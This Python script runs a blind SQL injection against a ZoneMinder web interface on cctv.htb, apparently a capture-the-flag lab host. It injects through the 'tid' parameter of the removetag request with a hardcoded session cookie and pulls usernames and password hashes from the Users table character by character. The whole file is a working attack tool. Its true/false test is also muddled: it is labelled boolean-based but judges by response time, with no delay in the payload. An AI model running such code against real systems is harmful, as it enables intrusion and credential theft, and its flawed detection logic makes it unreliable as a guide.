import requests
import time
import string

cookies = {'ZMSESSID': 'o4ct1n40rs4pabceijmcaq62bl'}
base_url = 'http://cctv.htb/zm/index.php'
charset = string.ascii_lowercase + string.digits + '_{}@.'

def extract_data(query, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            # Boolean-based blind payload
            payload = f"1' AND (SELECT SUBSTRING(({query}),{pos},1)='{char}')-- -"
            params = {
                'view': 'request',
                'request': 'event',
                'action': 'removetag',
                'tid': payload
            }
            start = time.time()
            response = requests.get(base_url, params=params, cookies=cookies)
            elapsed = time.time() - start
            
            # If the response time is normal, the condition is true
            if elapsed < 1:  # Adjust threshold as needed
                result += char
                print(f"Found: {result}")
                found = True
                break
        
        if not found:
            break
    return result

# Extract usernames
print("Extracting usernames...")
for i in range(1, 4):
    username = extract_data(f"SELECT Username FROM Users LIMIT {i-1},1")
    print(f"User {i}: {username}")

# Extract passwords
print("Extracting passwords...")
for i in range(1, 4):
    password = extract_data(f"SELECT Password FROM Users LIMIT {i-1},1", max_len=60)
    print(f"Password {i}: {password}")
